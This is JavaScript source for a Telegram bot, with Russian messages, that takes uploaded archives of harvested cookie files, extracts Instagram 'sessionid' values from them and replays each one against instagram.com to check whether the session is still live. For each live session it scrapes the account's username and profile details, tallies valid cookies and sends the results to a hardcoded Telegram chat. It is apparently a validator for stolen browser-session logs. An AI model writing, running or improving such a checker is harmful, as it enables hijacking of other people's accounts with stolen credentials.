"use strict";

const config = require('./config/config.json');
const Telegraf = require('telegraf')
const session = require('telegraf/session')
const Stage = require('telegraf/stage')
const Scene = require('telegraf/scenes/base')
const Extra = require('telegraf/extra')
const Markup = require('telegraf/markup')
const { enter, leave } = Stage

const fetch = require("node-fetch");
const fs = require("fs");
const https = require('https');
let { zip, unzip } = require('cross-unzip')
const archiver = require('archiver');
const { del } = require('request');


const bot = new Telegraf(config.bot_token);

//const stage = new Stage([scenes.paymentAmountScene, scenes.paymentMethodScene,scenes.qiwiPaymentScene, scenes.categoryScene, scenes.servicesScene], { ttl: 1800 })
bot.use(session());
bot.launch();
//bot.use(stage.middleware())
//bot.hears('Пополнить💲', (ctx) => ctx.scene.enter('paymentAmount', {amount : 100}))
bot.on("document", async (ctx) => {
    const documentName = ctx.update.message.document.file_name
    if(documentName.includes('.zip') || documentName.includes('.rar')){
        let messageId = ctx.update.message.message_id;
        let fileId = ctx.update.message.document.file_id;
        let link = await ctx.telegram.getFileLink(fileId);
        const filename = await downloadFile(link, `./3/download/`,documentName);
        const dir = await makeDirs(filename)
       
        await extractArchieve(filename,dir)

        const resultDir = dir+ '_result'
        const txtFiles = await  getTxtfiles(dir)
        //const result = await checkTxtCookies(txtFiles)
      //  const archiveName = await makeArchieve(resultDir)
        console.dir({filename,dir,resultDir,txtFiles})
      //  await bot.telegram.sendDocument('1351452476',{source :archiveName})
        //bot.telegram.sendMessage('1351452476',result) 
        //await deleteFiles(dir,archiveName)
        

    }else{
        ctx.reply('неудача')
    }
  });
  

bot.hears('id', (ctx) =>{
//  bot.telegram.sendMessage('1351452476','ok')
//bot.telegram.sendDocument('1351452476',{source :"./3/download/insta_result.zip"})
})
bot.command('start', async (ctx) =>ctx.reply('Привет'));

const downloadFile = async (url, path = "./3/download/",filename) => {
    const dirnames = await fs.readdirSync('./3/download',)
    while(dirnames.includes(filename)){
        filename = '(1)'+ filename
    }
    const fileStream = fs.createWriteStream(path + filename);
    await https.get(url, async function(response) {
 await response.pipe(fileStream);
});
return path + filename;
  };

  const deleteFiles = async(dir,filename) =>{
    await fs.rmdirSync(dir, { recursive: true });
    await fs.rmdirSync(dir+'_result', { recursive: true });
    if(fs.existsSync(filename))await fs.unlinkSync(filename)
}


const makeDirs = async (filename) =>{
    const newDir =filename.slice(0,-4);
    if (!fs.existsSync(newDir)){
        await fs.mkdirSync(newDir);
    }
    if (!fs.existsSync(newDir+'_result')){
        await fs.mkdirSync(newDir+'_result');
    }
      return newDir;
}

const extractArchieve = async(filename,newDir) =>{
  console.dir({filename,newDir})
  const promise = new Promise(function(resolve, reject){
      unzip(filename, newDir, function(response) {
          resolve();
      })})
  
    await promise.then(function(results){
      console.log('done')
    })

} 

const makeArchieve = async(dir) =>{

    let name = dir +'.zip'
    console.log(name)
    let output = fs.createWriteStream(name);
    let archive = archiver('zip');
    
    output.on('close', function () {
        //console.log(archive.pointer() + ' total bytes');
        //console.log('archiver has been finalized and the output file descriptor has closed.');
    });
    
    archive.on('error', function(err){
        throw err;
    });
    
    await archive.pipe(output);
    await archive.directory(dir, false);
    await archive.directory('subdir/', 'new-subdir');
    await archive.finalize();
    return name;

}

const getTxtfiles = async(dir) =>{
    let txtFilesArr = [];
    let filesArr = fs.readdirSync(dir);
    for(let el of filesArr){
if(el.slice(-3)== 'txt'){
await txtFilesArr.push(dir + '/' + el)
let index = filesArr.indexOf(el)
delete filesArr[index]
}
    }
    filesArr = filesArr.filter(n => n)
    if(filesArr[0]){
        for await(let el of filesArr){
            await txtFilesArr.push(getTxtfiles(dir+'/'+el))
        }
    }
    return txtFilesArr.flat();
}

const checkForValid = async (sessionIdCookie) => {
    if (typeof sessionIdCookie === "string") {
      let request = await fetch("https://www.instagram.com/", {
        headers: {
          Cookie: `sessionid=${sessionIdCookie}; Domain=.instagram.com; `,
        },
      })
        .then((request) => request.text())
        .then(async (body) => {
          let data = [];
          let arr = body.split("\n");
          for (let el of arr) {
            if (el.includes('viewer":{"biography')) {
              data.push(el);
            }
          }
          if (data[0]) {
            let text = data[0];
            let usernameStart = text.indexOf('username":"') + 11;
            let usernameEnd = text.indexOf('","badge_count"');
            let username = text.slice(usernameStart, usernameEnd);
            let usernameOutput = `https://www.instagram.com/${username}/`;
  
            let secondRequest = await fetch(usernameOutput, {
              headers: {
                Cookie: `sessionid=${sessionIdCookie}; Domain=.instagram.com; `,
              },
            })
              .then((secondRequest) => secondRequest.text())
              .then((body) => {
                let data = [];
                let arr = body.split("\n");
                for (let el of arr) {
                  if (el.includes('<meta content="')) {
                    data.push(el);
                  }
                }
                if (data[0]) {
                  let text = data[0];
                  let startStr = text.indexOf('content="') + 9;
                  let endStr = text.indexOf("- See Instagram photos");
                  let accountInfo = text.slice(startStr, endStr);
                  return `${usernameOutput} - ${accountInfo}\n`;
                }else{
                  return 'Couldn\'t find account data\n';
                }
              });
            return secondRequest;
          } else {
            return "Невалид\n";
          }
        });
      return request;
    } else {
      ctx.reply("wrong format\n");
      ctx.reply(typeof sessionIdCookie);
    }
  };

  const getSessionIds = async (path) => {
    let textArr = fs.readFileSync(path, "utf8").split("\n");
    let sessionIds = [];
     for (let el of textArr) {
      if (el.includes(".instagram.com") && el.includes("sessionid")) {
        
      //  console.dir(el)
        let start = el.lastIndexOf("\t") + 1;
        let end = el.lastIndexOf("\r");
        let sessionId;
        if(end < start){
          sessionId = el.slice(start);
        }else{
          sessionId = el.slice(start, end);
        }
        if(!sessionIds.includes(sessionId)){
            await sessionIds.push(sessionId);
        }
      }
    } 

        let res=[];
        for(let el of textArr){
                if(el.includes('.instagram.com')){
                    await res.push(el)
                }
            }
            if(res[0]){
              let characterCount = (path.match(new RegExp("/","g")) || []).length;
              let newPath;
              if(characterCount>4){
                let index = path.split("/", characterCount-1).join("/").length
                path =path.slice(0,index) +'_result' + path.slice(index)
                newPath =path.slice(0,path.lastIndexOf('_result')+7)+path.slice(path.lastIndexOf('/'))
                } else{
                let index = path.lastIndexOf('/');
                newPath = path.slice(0,index) +'_result' + path.slice(index);
                }
                 fs.writeFile(newPath,res.join(''),(err) => {
                    if (err) throw err;
                })  
            }
            //console.dir(res.join(''))  
        
    return sessionIds;
  };

  const checkTxtCookies = async(txtNameArr) =>{
    let allCookies = [];
    let txtRes = [];
    let validCounter =0;
    for(let txt of txtNameArr){
     //   console.log(txt)
       let cookie = await getSessionIds(txt)
       if(!allCookies.includes(cookie[0])){
        await allCookies.push(cookie[0])
       }

    }
     for(let cookie of allCookies){
        let checkRes = await checkForValid(cookie);
        console.log(checkRes)
    } 
    for(let el of txtRes){
        if(el.includes('instagram.com'))validCounter++;
    }
    await txtRes.unshift(`Валид: ${validCounter}\n`)
    await txtRes.unshift(`Всего найдено куков: ${allCookies.length}\n`)
    await txtRes.unshift(`Найдено txt файлов: ${txtNameArr.length}\n`)
    return txtRes.join('');
}





